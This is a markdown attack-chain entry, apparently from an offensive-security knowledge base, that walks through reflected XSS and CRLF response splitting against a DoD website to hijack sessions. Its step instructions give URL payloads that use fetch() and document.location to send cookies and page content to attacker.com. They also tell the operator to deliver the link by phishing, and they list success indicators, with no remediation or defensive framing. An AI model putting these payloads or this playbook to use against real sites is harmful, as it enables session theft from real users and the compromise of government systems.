---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
name: XSS via Malicious URL Leading to Session Hijacking on DoD Website
tags:
  - xss
  - crlf-injection
  - web
  - session-hijacking
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-XSS-via-Malicious-URL]]'
  - '[[procedures/Inject-CRLF-for-Response-Splitting]]'
step_count: 2
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:30.762Z'
description: >-
  A cross-site scripting attack exploiting insufficient input validation on a
  DoD website to inject malicious JavaScript via a crafted URL, enabling session
  theft or content manipulation.
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# XSS via Malicious URL Leading to Session Hijacking on DoD Website

Multi-stage attack chain demonstrating exploitation of XSS and potential CRLF injection on a DoD website to execute malicious JavaScript and hijack user sessions.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Craft Malicious URL] --> B[Execution: Inject and Trigger XSS]
    B --> C[Collection: Steal Session Data]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- Browser developer tools for payload crafting
- Proxy tool like Burp Suite for URL manipulation

### Target Environment

- Web platform
- DoD website with vulnerable input parameters
- No specific ports required; standard HTTP/HTTPS

### Initial Access Requirements

- Ability to craft and share URLs (e.g., via phishing or direct link)
- Victim must be authenticated user on the site
- Network access to the public-facing DoD website

## Detailed Attack Procedures

### Step 1: Craft and Deliver Malicious URL
procedure: [[procedures/Exploit-XSS-via-Malicious-URL]]

**Objective**: Identify a vulnerable URL parameter and inject a JavaScript payload to execute in the victim's browser.

**Instructions**: Analyze the DoD website for reflected XSS in URL parameters (e.g., search or redirect fields). Craft a payload such as `<script>alert(document.cookie)</script>` encoded for URL. Append to the vulnerable endpoint, e.g., `http://dod-site.com/search?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>`. Trick the victim into clicking the link via email or social engineering.

**Expected Output**: When the victim visits the URL, the JavaScript executes, sending session cookies to the attacker's server.

**Success Indicators**:
- Payload reflects unsanitized in the page source
- Alert or network request to attacker server observed
- Session data exfiltrated

### Step 2: Chain with CRLF Injection for Enhanced Manipulation
procedure: [[procedures/Inject-CRLF-for-Response-Splitting]]

**Objective**: Exploit CRLF injection to split responses, potentially amplifying XSS or injecting additional content.

**Instructions**: If the site lacks CRLF sanitization, inject `%0d%0a` (CRLF) in inputs to manipulate HTTP responses. For example, in a URL parameter: `http://dod-site.com/param=value%0d%0aContent-Length: 0%0d%0a%0d%0a<script>document.location='http://attacker.com/steal?data='+document.body.innerHTML</script>`. Deliver via the same social engineering method and observe response splitting leading to arbitrary content injection.

**Expected Output**: Server responds with split headers, injecting the script which executes in the browser, allowing content modification or further data theft.

**Success Indicators**:
- Response headers show injection (e.g., extra newlines)
- Malicious script loads and executes
- Page content altered or additional data sent to attacker

## Attack Chain Summary

### Key Achievements

1. Successful injection of JavaScript via URL parameter without validation
2. Exfiltration of user session cookies for potential hijacking
3. Chained CRLF to enable response manipulation and broader impact

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
